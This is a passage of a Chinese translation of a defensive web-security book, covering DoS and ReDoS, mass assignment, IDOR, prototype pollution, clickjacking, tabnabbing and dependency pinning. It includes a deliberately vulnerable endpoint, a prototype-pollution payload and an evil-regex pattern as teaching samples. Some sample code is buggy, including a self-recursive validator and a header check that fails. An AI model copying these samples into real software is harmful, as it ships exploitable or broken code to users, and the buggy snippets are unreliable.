注入攻击通常归因于数据库，特别是 SQL 数据库。但是，虽然数据库在没有编写妥善的代码和配置的情况下绝对容易受到注入攻击，但 API 端点（或依赖项）交互的任何 CLI 都可能是注入的受害者。

主流 SQL 数据库提供了防止 SQL 注入的缓解措施，但由于低劣的应用架构和不当编写的客户端到服务端代码，SQL 注入仍然是可能的。将最小权威原则引入您的代码库将通过最小化对您的组织和应用基础设施造成的损害，在发生入侵的情况下为您的应用提供协助。以安全第一的方式构建架构的应用将永远不会允许客户端（用户）提供将在服务器上执行的查询或命令。

如果用户输入需要转化为服务端操作，这些操作应该被加入白名单，以便只有总功能的一个子集可用，并且仅有经负责任的安全审查团队审核为安全的功能。

通过使用这些控制措施，应用发生注入类漏洞的概率将大大降低。

---

## 第 32 章防御 DoS 攻击
拒绝服务（Denial of Service，DoS）攻击通常涉及对系统资源的消耗，在缺乏健壮的服务器日志记录的情况下，检测此类攻击可能会有些困难。如果过去的 DoS 攻击是通过合法的渠道（例如 API 端点）发起的，那么要检测它们将是极其困难的。

因此，防范 DoS 类攻击的第一步措施，应当是在服务器中构建足够全面的日志系统，使所有请求以及它们的响应时间都被记录在案。您还应当手动记录任何异步“任务”类函数（例如，通过 API 调用但在后台运行且在完成后不生成响应的备份任务）的性能。这样做将使您能够发现利用 DoS 漏洞（服务端）的任何尝试（意外的或恶意的），否则这些尝试原本是难以发现且耗时的。

如第 14 章所述，DoS 攻击在构建时，其脑海中通常包含以下一个或多个预期结果：

* 耗尽服务器资源
* 消耗客户端资源
* 请求不可用的资源
* 拒绝访问资源

在前两者中，在没有关于服务器或客户端生态系统直接认知的情况下，更容易实施漏洞利用。在构建缓解 DoS 威胁的计划时，我们需要考虑所有这四个潜在的威胁。

### 防御正则 DoS

正则表达式拒绝服务（Regular Expression Denial of Service，Regex DoS / ReDoS）攻击可能是最容易防御的 DoS 形式，但它们需要关于攻击如何构建的先验知识（如第 176 页“ReDoS”中所示）。通过妥善的代码审计流程，您可以防止 ReDoS 接收点（邪恶的或恶意的正则表达式）混入您的代码库中。

您需要寻找针对重复组执行显著回溯（Backtracing）的正则表达式。这些正则表达式通常遵循类似于 `(a[ab]*)+` 的形式，其中 `+` 表示执行贪婪匹配（Greedy Match）（在返回之前寻找所有潜在的匹配），而 `*` 表示尽可能多地匹配子表达式（Subexpression）。

因为可以在不引入 DoS 风险的前提下基于该技术构建正则表达式，所以在没有误报的情况下找到所有邪恶正则表达式的实例可能会很耗时且困难。在这种情况下，使用开源（OSS）工具来扫描您的正则表达式以寻找恶意片段，或者使用正则表达式性能测试器来手动检查输入，可能会大有裨益。如果您可以捕获并防止这些正则表达式进入您的代码库，那么您就完成了确保应用免受 ReDoS 攻击的第一步。

第二步是确保应用中没有使用用户提供正则表达式的位置。允许用户上传正则表达式就像是在雷区中散步，并期盼着您正确记住了安全路线图一样。维持这样的系统需要巨大的协同努力，并且从安全角度来看，这通常是一个极其糟糕的主意。您还想确保与您集成的任何应用都没有使用用户提供的正则表达式，或者没有使用编写低劣的正则表达式。

### 防御逻辑 DoS

逻辑 DoS 相比 ReDoS 更难检测和防范。与 ReDoS 类似，在大多数情况下逻辑 DoS 是无法被利用的，除非您的开发人员无意中引入了一段可以被滥用以消耗系统资源的逻辑。

也就是说，没有可利用逻辑的系统通常不会沦为逻辑 DoS 的牺牲品。然而，这是可能的，因为 DoS 是在一定范围上进行衡量的（而不是二元评估），并且编写精良的应用仍可能会受到逻辑 DoS 的打击（假设攻击者拥有海量的资源，足以压垮通常高性能的代码）。

因此，我们应该从 DoS 风险的角度来思考暴露的功能——例如高/中/低。这比“有漏洞/安全”更有意义，因为 DoS 依赖于资源的消耗，与 XSS 等其他完全二元的攻击相比，这很难归类。对于 XSS 而言，要么存在 XSS 漏洞利用，要么不存在。仅此而已。

对于 DoS，您可能会发现有些代码极难利用，有些代码极易利用，还有一些介于两者之间。使用高性能台式机的用户可能不会注意到一个可利用的客户端函数，但使用旧款移动设备的用户可能会注意到。通常来说，我们将极难利用的代码称为“安全”，而将其他两类称为“有漏洞”。在评估应用的安全性时，我们宁可谨慎行事。

为了防御逻辑 DoS，我们需要识别代码库中使用了关键系统资源的领域。

### 防御 DDoS 攻击

分布式拒绝服务（Distributed Denial of Service，DDoS）攻击要比源自单个攻击者的 DoS 攻击难防御得多。虽然单源 DoS 攻击通常针对应用代码中的 Bug（例如编写不当的正则表达式或消耗大量资源的 API 调用），但 DDoS 攻击在性质上通常要简单得多。

Web 上的大多数 DDoS 攻击源自多个源，但由一个集中式的源进行控制。这是由单个攻击者或攻击者组织通过某种渠道分发恶意软件来协同编排的。该恶意软件在合法 PC 的后台运行，并可能与合法的程序打包在一起。由于恶意软件提供的后门，合法的 PC 可以被远程控制，从而使它们能够被成批使用，来执行黑客的命令。

PC 并不是唯一容易受到此类攻击的设备。移动设备和物联网（IoT）设备（路由器、热点、智能烤箱等）都可能成为目标，且往往比台式机更容易被攻破。

无论在 DDoS 攻击中受陷和使用的是何种设备，成批的设备都被称为**僵尸网络（Botnet）**。您可能已经注意到，*botnet* 一词由 *robot*（机器人）和 *network*（网络）组成，暗指一个用于执行某人指令（通常用于作恶）的机器人网络。

DDoS 攻击通常不针对逻辑 Bug，而是企图通过海量的、看起来合法的流量来压垮目标。通过这样做，真正的用户被拒之门外，或者合法用户的应用体验被极大地减慢。

DDoS 攻击是无法被完全预防的。然而，它们可以在许多方面得到缓解。最简单的方法是投资带宽管理（Bandwidth Management）服务。这些服务由市场上的许多供应商开发，但最终对通过其服务器的每个数据包执行分析。这些服务对数据包运行成熟的扫描，以确定它是否显得以恶意的模式进入。如果一个数据包被判定为恶意的，它将不会被转发到您的 Web 服务器。

这些带宽管理服务之所以有效，是因为它们能够拦截大量的网络请求，而您的应用基础设施（特别是在个人兴趣项目和小型商业应用中）很可能无法承受。

在您的 Web 应用架构中可以实现额外的措施来缓解 DDoS 风险。一种常见的技术被称为黑洞路由（Blackholing），即在主应用服务器之外，您还设置了许多服务器。

看起来可疑的（或重复的）流量会被发送到黑洞（Blackhole）服务器，该服务器看起来运行得像您的应用服务器，但不执行任何操作。合法的流量照常被路由到您合法的 Web 应用服务器。不幸的是，虽然黑洞对于重路由恶意流量非常有效，但如果没有以足够的精确度进行定位，它们也可能会重路由合法的流量。黑洞在防范小型 DDoS 攻击时表现出色，但在应对大规模 DDoS 攻击时表现不佳。

使用这些技术中的任何一种时，请记住，过度敏感的过滤器很可能也会阻断合法的流量。正因为如此，在实现任何激进的 DDoS 缓解措施之前，对您合法用户的行为模式拥有深度的度量指标是理想的。

### 总结 

DoS 攻击有两种主要范式：单个攻击者（DoS）和多个攻击者（DDoS）。大多数（但不是全部）DDoS 攻击是通过压垮服务器资源来实现的，而不是通过漏洞利用。因此，DDoS 的应对措施也可能会给合法用户带来困难。另一方面，单源 DoS 攻击可以通过聪明的应用架构来缓解，该架构可以防止用户能够在很长一段时间内接管应用资源。基于正则表达式的 DoS 攻击可以通过实现静态分析工具（例如 Linter）来扫描代码库中的正则表达式并在其在语法上显得“邪恶”时发出警告，从而得到缓解。

由于其通常易于利用，DoS 类的攻击在整个 Web 上猖獗。即使您不期望应用成为 DoS 攻击的目标，一旦资金允许，请立即实现抗 DoS 缓解措施，以备不时之需。

---

## 第 33 章保障数据与对象安全
尽管是各种攻击形式的目标，但应用代码内的数据和对象实际上相当容易进行防御。在数据库中的数据存储之外，编程语言交互的大多数对象要么以临时方式存储（在内存中），要么以持久方式存储（在文件系统中）。

因为编程语言主要在内存中执行操作，所以在处理持久的文件存储数据时，大多数时候数据在操作期间会被引入到内存中。因此，在许多情况下，有利于临时数据的防御同样也有利于文件系统数据。

### 防御批量赋值 

如果在编写 Web 应用时考虑到了安全性，批量赋值（Mass Assignment）攻击是相对容易防止的。考虑以下批量赋值漏洞：

```javascript
/*
 * 这是一个用于更新基于 Web 的视频游戏 "MegaGame" 的玩家数据的服务端 API 端点。
 */
app.post("updatePlayerData", function(req, res, next) {
 // 如果客户端发回了玩家状态数据，在数据库中进行更新
 if (!!req.body.data) {
  db.update(session.currentUser, req.body.data);
  return res.sendStatus(200); // 成功
 } else {
  return res.sendStatus(400); // 错误
 }
});
```

此漏洞之所以存在，是因为开发人员选择**信任**由客户端发送的数据，并根据一个可能被恶意用户篡改的对象来更新数据库字段。

针对此类赋值攻击，有两种通常被接受的防御方法。

#### 验证与白名单 

缓解批量赋值最简单的方法是仅仅限制从客户端接受的字段。这最好以白名单的形式完成。

通过创建以下白名单，并在调用 `db.update()` 函数之前以验证的形式实现它，我们可以放心，对 `admin` 字段的批量赋值将是不可能的：

```javascript
const allowlist = ["hp", "location"]; // 仅允许更新这两个字段
```

#### 数据传输对象

第二种更深入的缓解方法是创建一个被称为数据传输对象（Data Transfer Object，DTO）的中间对象。在服务或函数调用之间传递数据时，会使用 DTO。

在我们的案例中，DTO 将如下所示：

```javascript
const DTO = function(hp, location) {
 this.hp = hp;
 this.location = location;
};
```

通过运行所有传入数据通过 DTO 构造函数，任何额外的参数都将被拒绝。这防止了恶意的客户端数据最终进入 `db.update()` 函数中。

### 防御 IDOR 攻击 

优秀的应用架构是防御不安全的直接对象引用（Insecure Direct Object Reference，IDOR）的第一道防线。绝不应该直接引用或者通过任何容易猜到的 API 结构来引用对象和文件。在用户需要访问特定文件的情况下，结合隐藏 API 调用（以不显示特定的文件名）并在每个文件返回之前执行授权检查是一个极佳的解决方案。

在上述方案不可行的情况下，使用随机生成的文件名和对象引用可以提供安全性——但前提是存在其他机制（如速率限制），并且随机生成的文件名具有足够的熵和复杂度，以至于需要进行数百万次猜测才能找到另一个文件。同样，这并不是理想的解决方案，但通常是一项短期缓解措施，直到可以进行长期的架构重构。

### 防御反序列化攻击

每个反序列化攻击的核心都是脆弱的反序列化。这意味着，防止针对您 Web 应用的序列化相关攻击的主要缓解措施，是使用健壮、经过充分测试的序列化（Serialization）和反序列化（Deserialization）库。

在 Web 应用的情况下，通常最好选择拥有数百万用户且具有安全审计历史的开源库。选择诸如 JSON 或 YAML 等流行的格式，避免使用几乎没有成功记录的格式。

考虑您打算序列化的数据类型。容易被服务器或浏览器解释为脚本的数据，或者包含常见转义字符的数据，应该由序列化器或另一个函数进行净化，以确保在序列化和反序列化发生之前将此类字符移除。如果序列化器无法处理此类字符和对象，可以将输入字符和对象类型加入白名单，以降低此类风险的概率。

## 总结 

虽然针对复杂对象和数据的攻击确实存在（且看起来像是 Web 编程语言的一个缺点），但它们通常很容易防御。在设计 Web 应用时将此类数据和对象攻击牢记在心，并理解其风险，应该会让您感到心安，因为针对这些问题的缓解措施是很容易获取的。

---

## 第 34 章防御客户端攻击
在第 16 章中，我们广泛涵盖了三种形式的客户端攻击（原型链污染、点击劫持和标签页劫持）。在这些攻击中，我们都能够通过用户的客户端浏览器来利用用户，而不需要通过服务器来攻击终端用户。随着浏览器客户端每年变得越来越复杂，客户端攻击呈上升趋势。

由于在尝试检测客户端攻击时伴随而来的局限性，在构建您的应用时，确保以一种使攻击者难以成功实施客户端攻击的方式设置您的应用是势在必行的。在本章中，我们将涵盖这些技术，以便您的 Web 应用在成为客户端攻击的目标时能够尽可能安全。

### 防御原型链污染

原型链污染（Prototype Pollution）攻击依赖于 JavaScript 的原型继承（Prototypal Inheritance）系统来发挥作用（详细的攻击和 Payload 开发请参阅第 16 章）。由于 JavaScript 解释器顺着原型链向上寻找函数和数据的方式，攻击者极有可能在没有直接访问的情况下污染一个对象（通过污染继承层级结构中的关联对象）。

起初，由于原型链污染攻击在很大程度上依赖于 JavaScript 特有的语言特性，因此它们难以被发现和缓解。但一旦您掌握了它的窍门，缓解措施就会变得极其容易理解。让我们看一看阻止原型链污染攻击的几种最有效的方法。

#### 键名净化

防止原型链污染攻击最简单的方法之一，是确保您应用的 JavaScript 代码在合并或使用这些键名操作 JavaScript 对象之前，对所有用户提供的键名进行净化。

考虑以下代码片段。这段 JavaScript 代码代表了在应用中代表恶意用户的输入所生成的输入：

```javascript
// 通过地址收集表单提交
const obj = {
 "__proto__": { "role": "admin" }
}
```

在此案例中，当合并到另一个对象中时，键名 `__proto__` 是对象中利用原型链的部分。

如果我们提供一个可用键名的白名单，我们可以轻松遍历用户输入，并通过简单的净化来防止攻击：

```javascript
const allowedKeys = ["street", "city", "state", "firstName", "lastName"];

const isKeyValid = function(key) {
 if (!allowedKeys.includes(key)) {
  return false;
 } else {
  return true;
 }
};

const updateUserData = function(data) {
 let isValid = true;
 for (const [key, value] of Object.entries(data)) {
  if (!isKeyValid(key)) {
   isValid = false;
  }
 }

 if (!isValid) {
  console.error("an invalid key was found!");
 } else {
  updateUserData(data); // 译者注：原文此处存在代码逻辑死循环递归，仅作安全演示，生产部署切勿照搬
 }
};
```

白名单和验证对象键名并不总是可接受的缓解措施，因为某些应用需要接受灵活的用户输入，且无法依赖静态的允许键名集。然而，在可行的情况下，这是防御原型链污染攻击的最佳第一道防线。

#### 原型冻结

缓解原型链污染攻击的另一种解决方案是 JavaScript 内置的 `Object.freeze()` 函数。`Object.freeze()`（又称“冻结函数”）修改了 JavaScript 对象的默认性质，使其变为不可变的（Immutable）而不是可变的（Mutable）。

被冻结的对象在浏览会话的其余时间内无法更新任何键名、值或其他属性。一旦标签页关闭并重新打开，在再次调用 `Object.freeze()` 之前，该对象将再次变为可变的。这意味着，通过函数调用 `Object.freeze(userData)` 针对名为 `userData` 的对象调用冻结函数，将防止 `userData` 在页面刷新之前被更新。

冻结对象是防御原型链污染攻击的极佳缓解措施，但主要的局限性在于，无论是恶意的还是非恶意的目的，都无法再修改被冻结的对象。这意味着，当与合法的自主开发代码进行交互时，对象所具有的功能水平会显著降低，这会使开发人员开发复杂的应用变得困难得多。

需要注意的另一个警示是，批量冻结 JavaScript 或 DOM API 虽然在理论上听起来像是一个好主意，但会带来严重的后果。几十个 DOM API 和 JavaScript API 在编写时都依赖于其他对象和函数的易变性。正因为如此，如果您尝试执行批量冻结，或者在沿着原型链执行迭代（循环）冻结调用时意外冻结了内置的 API，整个功能领域都将会崩溃。

出于这些原因，虽然冻结函数在阻止原型链污染攻击方面非常强大，但应该谨慎使用，以防止应用功能的非预期丢失。

#### 无原型对象

作为防御原型链污染攻击的最后一种缓解措施，如果您担心对象可能会在应用生命周期的后期受到原型链污染攻击，您可以在实例化期间切断对象的原型链。

通过直接利用对象构造函数（而不是手动创建对象），您可以指定一个原型作为参数进行继承。考虑以下代码片段：

```javascript
// 传统的对象创建
const myObj1 = { username: "testUser1" }

// 手动调用对象构造函数继承自 null
const myObj2 = Object.create(null);
```

```javascript
myObj2["username"] = "testUser2";
Object.getPrototypeOf(myObj2); // null
```

虽然任何对象都可以通过对象构造函数来执行初始的原型设置，但传入 `null` 会创建没有原型的对象。因为创建的对象没有原型，所以它无法顺着原型链向上寻找，且无法通过父对象进行污染，因为不存在父对象。

### 防御点击劫持

有许多种防御点击劫持（Clickjacking）的方法，但只有两种是高度有效的。一种是在 CSP 级别实现的，另一种是在 JavaScript 中实现的。

如果您通读关于防御点击劫持攻击的 Web 文档，您可能会看到传统的防御措施——特别是利用诸如 `X-Frame-Options` 等响应头的防御措施。请注意，这些响应头已被大多数主流浏览器视为废弃，不应该被认为是有效的防线。

#### 框架祖先

停止绝大部分点击劫持攻击最简单且最有效的方法，是在网站的 CSP 策略中实现一个简单的更改（有关实现 CSP 策略的更多细节，请参阅第 22 章“安全的应用配置”）。

`frame-ancestors` 指令可以实现于 CSP 响应头或 `meta` 标签中，类似于所有其他主要的 CSP 指令。无论在哪里实现，该指令都采用以下结构：

```http
Content-Security-Policy: frame-ancestors 'none';
```

在此案例中，Web 应用将 `frame-ancestors` CSP 指令设置为 `none`，这告诉浏览器防止任何网页在 iframe 内部加载它。由于超过 95% 的现代 Web 浏览器支持此指令，因此实现此简单解决方案将防止您的网站在 iframe 内部被加载——从而阻止了几乎所有的点击劫持尝试。

如果您的 Web 应用确实具有在其他地方被嵌套框架的用例，您可以放宽该策略，并以白名单的方式指定可以嵌套框架的位置：

```http
Content-Security-Policy: frame-ancestors subdomain.my-website.com
```

在您的 Web 应用需要在 iframe 内部包含自身副本的罕见情况下，也可以使用 `self` 选项。

通过实现这些解决方案中的任何一种，您都可以防止恶意网站在 iframe 内部嵌套框架您的网站，这将停止绝大部分的点击劫持攻击。

#### 防框架嵌套脚本

在您的 Web 应用受到少数不支持 CSP `frame-ancestors` 的浏览器之一支持的情况下——或者如果您具有罕见的框架嵌套用例、且这阻止了将 CSP 作为可接受的解决方案——还有一种替代的缓解措施。防框架嵌套脚本（Framebuster scripts）（有时也称为 framekillers）是您可以包含在页面中的 JavaScript 函数，用于检测您的网站是否在您不允许的某个地方被嵌套在 iframe 内部。

如果检测到了 iframe，防框架嵌套脚本可以阻止您的应用代码在浏览器中加载，或者迅速卸载它。一个简单的防框架嵌套脚本如下所示：

```css
html {
 display:none;
}
```

```javascript
if (self == top) {
 document.documentElement.style.display = 'block';
}
```

使用此防框架嵌套脚本，在 CSS 代码中，您的网站被设置为 `display: none`。此 CSS 代码应该包含在 head 块中，以确保它在页面主体之前加载。JavaScript 代码应该导入到页面主体中，以便它在 CSS 之后加载。

当包含这两个片段的应用加载到 Web 浏览器中时，其内容将被设置为 `display: none`，这既使内容不可见，又防止了用户交互。通过防止用户交互，被点击劫持的点击将无法与页面进行交互。

当 JavaScript 防框架嵌套脚本加载时，它将通过比较内置对象 `self` 和 `top` 来检查它是否是最顶层的窗口。如果是最顶层的窗口，那么它将把其显示模式转换为 `block`，这将导致 HTML 内容变得可见且可交互。如果它不是最顶层的内容，其脚本将继续执行，但不会在页面上渲染任何可交互的或可见的内容。

您可能会看到对旧形式防框架嵌套代码的提及，这些代码允许在启动防框架嵌套脚本之前加载页面。这些传统的解决方案不被认为是理想的；在这些解决方案中，仍然存在可以被点击劫持的点击窗口时间，并且高水平的攻击者可以停止或延迟脚本执行，以防止传统的防框架嵌套代码按预期执行。

### 防御标签页劫持

由于存在许多内置的浏览器缓解措施，因此在您构建 Web 应用时，通过妥善的规划可以很容易地防御标签页劫持（Tabnabbing）攻击。由于这些解决方案部署起来相对简单，所以在任何新应用上都应该默认实现它们。遗憾的是，许多应用忽略了这些步骤，因而容易受到标签页劫持的攻击。

#### 跨源开放者政策

如第 22 章中所述，CSP 现在支持一项名为跨源开放者政策（Cross-Origin-Opener Policy，COOP）的策略。此策略确定了在超链接中打开时，哪些网站被赋予对 `window` 对象引用的访问权限。

默认情况下，COOP 应该始终设置为以下值，这将防止任何打开的链接能够引用它们所源自的网站：

```http
Cross-Origin-Opener-Policy: same-origin
```

对于绝大部分的标签页劫持案例，这应该是第一道防线解决方案。CSP COOP 仅在涉及使用多个域名的大型网站的情况下才会成为问题。在这种情况下，应该结合使用较为放宽的 CSP COOP 与以下技术之一。

#### 链接阻断器

因为超链接在默认情况下允许对打开网页的引用（供打开的网页访问），所以在没有采取妥善预防措施的情况下，允许用户生成链接是有风险的。幸运的是，一个简单的 HTML 属性（现在在所有主流浏览器上都受支持）可以将提供给目标网站的 `window.opener` 引用切换为 `null`：

```html
<a href="malicious-website.com" rel="noopener">click me</a>
```

在先前的代码片段中看到的 `noopener` 属性通过将其设置等于 `null`，阻断了新打开页面的窗口引用。

在对动态生成的链接使用 `noopener` 时，您还应该包含其兄弟属性 `noreferrer`，这将阻断目标网站访问 `referrer` 信息，以确定其流量来自何处。

这两项策略都在以下代码片段中实现：

```html
<a href="malicious-website.com" rel="noopener noreferrer">click me</a>
```

通过将这两个策略部署到位，您应用的安全性合隐私性都得到了极大的改善，并且通过动态链接进行的标签页劫持变得不可能。

### 隔离策略

利用一项被称为获取元数据（Fetch Metadata）的崭新浏览器功能（该功能支持灵活的隔离策略），可以缓解海量的客户端攻击。隔离策略是一项非常新颖且强大的浏览器安全功能，目前仅在 Firefox 和 Chrome Web 浏览器的最新构建版本上可用。隔离策略在 Safari 的桌面或 iOS 版本上尚不可用，在大多数国际浏览器上也不可用。因此，隔离策略目前应该被认为是防御在深度（Defense-in-Depth），也就是说，这是一项始终与其他缓解措施一起实现的防御机制。

作为获取元数据功能的一部分，Chrome 和 Firefox（以及未来的所有 Web 浏览器）在处理每个请求时都会发回名为 `Sec-Fetch-Site`、`Sec-Fetch-Mode`、`Sec-Fetch-Dest` 和 `Sec-Fetch-User` 的请求头，这些请求头为服务器提供了关于应用如何被请求以及它将在哪里加载的有价值的数据。

`Sec-Fetch-Site` 请求头向服务器指示网站在哪里被请求。以下是有效的选项：

**same-origin**
> 请求是从其自身的源发起的。

**same-site**
> 请求是从应用的子域名发起的。

**cross-site**
> 请求是从不同的网站发起的。

**none**
> 请求不是从网站发起的（例如，书签或插件）。

`Sec-Fetch-Mode` 请求头提供了关于请求网站模式的信息。以下选项是可能的：

**same-origin**
> 浏览器正在向相同的源发起请求。

**no-cors**
> 浏览器正在向另一个源发起请求，但不期望读取响应。

**cors**
> 浏览器正在发起利用 CORS 的请求（有关 CORS 的更多信息，请参阅第 22 章）。

**navigate**
> 请求是由链接点击、书签或重定向发起的。

`Sec-Fetch-Dest` 请求头告知服务器内容将在哪里加载。允许以下值：

* audio
* audioworklet
* embed
* font
* frame
* manifest
* object
* paintworklet
* report
* script
* serviceoworker
* sharedworker
* style
* track
* video
* xslt

最后，`Sec-Fetch-User` 请求头的值要么为 `null` 要么为 `1`，其中 `1` 表示浏览器判定用户发起了请求。`null` 表示浏览器判定脚本或插件发起了请求。

通过在服务端结合这些请求头的结果，您可以针对各种客户端攻击创建强大的缓解措施。作为一个示例，以下服务端缓解措施用于防止网站被嵌套框架，从而阻断了绝大部分的点击劫持攻击：

```javascript
app.get('/index.html', function(req, res, next) {
 if (req.headers["Sec-Fetch-Dest"]) {
  const dest = req.headers["Sec-Fetch-Dest"];
  if (dest === "frame") {
   return res.sendStatus(400);
  } else {
   return res.sendFile("/index.html"); // 译者注：原文此处有多余右括号，译文予以修正
  }
 }
});
```

### 总结

虽然客户端攻击正变得越来越普遍，但对抗这些攻击的缓解措施也正在以惊人的速度变得更加先进。幸运的是，通过使用可以通过简单的配置更改来实现的缓解措施，绝大部分的客户端攻击至少部分地被浏览器阻止了。

了解所有形式的客户端攻击并确保启用了适当的缓解措施，将以极少的时间和精力投入，极大地改善您 Web 应用的安全姿态。正因为如此，学习客户端攻击缓解措施是改善应用安全姿态最节省时间且最具成本效益的方法之一。

---

## 第 35 章保障第三方依赖安全
在第 6 章中，我们研究了识别第一方 Web 应用中第三方依赖项的方法。在第 17 章中，我们分析了在第一方 Web 应用中集成第三方依赖项的各种方式。基于这些集成，我们能够识别潜在的攻击向量并讨论了利用此类集成的方法。

因为第三部分是关于扼制黑客的防御性技术，所以本章完全关于在与第三方依赖项集成时，如何保护您的应用免受可能出现的漏洞的侵害。

### 评估依赖树

在考虑第三方依赖项时，要记住的最重要的事情之一是，它们中的许多都拥有它们自己的依赖项。有时这些被称为第四方依赖项。

手动评估缺乏第四方依赖项的单个第三方依赖项是可行的。在许多情况下，手动代码级别的第三方依赖项评估是理想的。

遗憾的是，手动代码审计的扩展性并不好。在许多情况下，全面审计依赖于第四方依赖项的第三方依赖项是不可能的，特别是如果这些第四方依赖项包含它们自己的依赖项，以此类推。

第三方依赖项、它们的依赖项、这些依赖项的依赖项等，构成了所谓的依赖树（Dependency Tree）（见图 35-1）。在基于 npm 的项目中，使用 `npm ls` 命令，您可以列出完整的依赖树以供评估。此命令对于查看您的应用实际上具有多少依赖项非常强大，因为您可能不会定期考虑子依赖项。

`[图片]`
> 图 35-1. npm 依赖树

依赖树在软件工程中非常重要，因为它们允许评估整个应用的编码，这可以带来显著的文件和内存大小精简。

#### 建模依赖树

考虑具有如下依赖树的应用：

```text
主应用 → JQuery
主应用 → 单页应用框架 → JQuery
主应用 → UI 组件库 → JQuery
```

能够建模依赖树将允许应用识别依赖链的三个部分都依赖于 JQuery。结果是，JQuery 可以被导入一次并在许多地方使用，而不是被导入三次（导致冗余的文件和内存存储）。

在安全工程中，建模依赖树也同样重要。这是因为如果没有妥善的依赖树建模，评估第一方应用的每个依赖项是极其困难的。

在理想世界中，依赖 JQuery 运行的应用中的每个组件（如前面的示例）都将依赖相同版本的 JQuery。但在现实世界中，情况很少如此。第一方应用可以统一依赖项版本，但第一方应用不太可能与依赖链的其余部分保持统一。这是因为依赖链中的每个条目都可能依赖因版本而异的功能或实现细节。关于何时以及如何升级依赖项的哲学也因组织而异。

#### 现实世界中的依赖树

现实世界中的依赖树通常看起来像：

```text
主应用 v1.6 → JQuery 3.4.0
主应用 v1.6 → 单页应用框架 v1.3.2 → JQuery v2.2.1
主应用 v1.6 → UI 组件库 v4.5.0 → JQuery v2.2.1
```

依赖项的 2.2.1 版本极有可能包含严重漏洞，而 3.4.0 版本则没有。因此，除了每个唯一依赖项之外，还应该评估每个唯一依赖项的每个唯一版本。在具有数百个第三方依赖项的大型应用中，这可能会导致依赖树横跨成千上万、甚至数万个唯一的子依赖项和依赖项版本。

#### 自动化评估

显而易见，手动妥善评估一个拥有上万项长依赖链的大型应用几乎是不可能的。因此，必须使用自动化的手段来评估依赖树，并且应该额外使用其他技术来确保所依赖依赖项的完整性。

如果可以将依赖树拉入内存并使用树状数据结构进行建模，那么遍历依赖树将变得相当简单且出奇地高效。在添加到第一方应用时，应该评估任何依赖项及其所有的子依赖树。这些树的评估应该以自动化的方式执行。

开始在依赖树中寻找漏洞最简单的方法，是将您应用的依赖树与众所周知的 CVE 数据库进行比对。这些数据库托管了在众所周知的 OSS 包和经常集成在第一方应用中的第三方包中发现的漏洞的列表和重现。

您可以下载第三方扫描器（如 Snyk）或编写一小段脚本来将您的依赖树转换为列表，并随后将其与远程 CVE 数据库进行比对。在 npm 世界中，您可以使用如下命令开始此流程：

```bash
npm list --depth=[depth]
```

您可以将您的发现与许多数据库进行比较，但为了长久起见，您可能希望从 NIST 开始；它由美国政府资助，并且很可能会长期存在。

### 安全的集成技术

在第 207 页的“集成方法”中，我们评估了不同的集成技术，从旁观者或攻击者的角度讨论了每种技术的优缺点。

让我们设想，我们现在正从应用所有者的角度来审视集成。集成第三方依赖项最安全的方法是什么？

#### 关注点分离

不幸的是，在您的主应用服务器上集成第三方代码的一个风险是，如果最小权威原则没有得到正确实现，该代码可能会产生副作用，或者（如果失陷）能够接管系统资源和功能。缓解此风险的一种方法是，在它自己的服务器（理想情况下由您的组织维护）上运行第三方集成。

在它自己的服务器上设置好集成后，让您的服务器通过 HTTP 与其通信——发送和接收 JSON Payload。JSON 格式确保在没有额外漏洞的情况下，在应用服务器上执行脚本是不可能的（链路结合漏洞利用），并且只要您不在依赖项服务器上持久化状态，就可以将依赖项更多地视为“纯函数”。

请注意，虽然这降低了主应用服务器上的风险，但如果该包失陷，发送给依赖项服务器的任何机密数据仍可能会被修改并潜在地记录下来（配合不当配置的防火墙）。此外，由于增加了函数返回数据的传输时间，该技术将导致应用性能有所下降。

但其背后的概念可以应用在其他地方；例如，单个服务器可以采用许多具有硬件定义的进程和内存边界的模块。通过这样做，一个“高风险”的包将很难获取主应用的资源和功能。

#### 安全的包管理

当处理诸如 npm 或 Maven 的包管理系统时，每个单独系统以及已发布应用所需的边界和审查都伴随着一定数量的公认风险。缓解由以此方式安装的第三方包带来风险的一种方法是，单独审计依赖项的特定版本，然后将语义化版本（Semantic Versioning）“锁定”到经审计的版本号。

语义化版本使用三个数字：一个“主”（major）版本、一个“次”（minor）版本和一个“修订”（patch）版本。通常来说，默认情况下，大多数包管理器会尝试自动使您的依赖项保持在最新的修订版本。这意味着，例如，`myLib 1.0.23` 可能会在您不知情的情况下升级到 `myLib 1.0.24`。

默认情况下，npm 将在任何依赖项之前包含一个插入符号（^）。如果您移除此插入符号，依赖项将使用确切的版本，而不是最新的修订版本（1.0.24 对比 ^1.0.24）。

此技术虽然对大多数人来说是未知的，但如果依赖项维护者使用已有的版本号部署新版本，它并不能保护您的应用。在 npm 和其他几个包管理器中，完全取决于依赖项维护者是否遵守“新代码 $\rightarrow$ 新版本号”的规则。此外，该技术仅强制顶层依赖项保持确切的版本，并不适用于子代依赖项。

这就是锁定的依赖（Shrinkwrapping）发挥作用的地方。针对 npm 仓库运行命令 `npm shrinkwrap` 将生成一个名为 `npm-shrinkwrap.json` 的新文件。从此时起，每个依赖项和子依赖项（依赖树）的当前版本都将使用确切的版本级别。

这消除了依赖项更新到最新修订版本并拉入脆弱代码的风险。然而，它并没有消除包维护者为期依赖项重用版本号的极罕见风险。为了消除此风险，请修改您的 shrinkwrap 文件以引用 Git SHA，或者部署您自己的、包含每个依赖项正确版本的 npm 镜像源（Mirror）。

### 总结

当今的 Web 应用通常拥有成千上万个（如果不是更多）应用功能正常运行所需的单个依赖项。确保每个依赖项中每个脚本的安全是一项巨大的工程。因此，应该假设任何第三方集成都伴随着至少一些期望的风险（以换取缩短的开发时间）。然而，虽然此风险无法消除，但可以通过许多方式进行缓解。

应用最小权限原则，我们可以让特定的依赖项在它们自己的服务器上运行，或者至少在具有隔离的服务器资源的其自身环境中运行。此技术降低了在发现严重安全 Bug 或恶意脚本未被察觉的情况下应用其余部分的风险。然而，对于某些依赖项而言，隔离是困难或不可能的。

与您的核心 Web 应用极其紧密集成的依赖项，应该在特定的版本号上进行独立评估。如果这些依赖项是通过类似 npm 的包管理器引入的，它们应该被锁定版本并锁定依赖（Shrinkwrapped）。为了额外的安全，考虑引用 Git SHA 或部署您自己的 npm 镜像源。处理 npm 的相同技术同样适用于在其他语言中使用的其他类似的包管理器。

总之，第三方依赖项始终呈现风险，但带有一些思考的精心集成可以缓解很多您的应用原本会暴露出的前期风险。

---

## 第 36 章缓解业务逻辑漏洞
在第 18 章中，我们讨论了难以捉摸的业务逻辑漏洞。这是一种无法通过自动化轻易检测、且无法通过渗透测试轻易发现的高级漏洞形式。

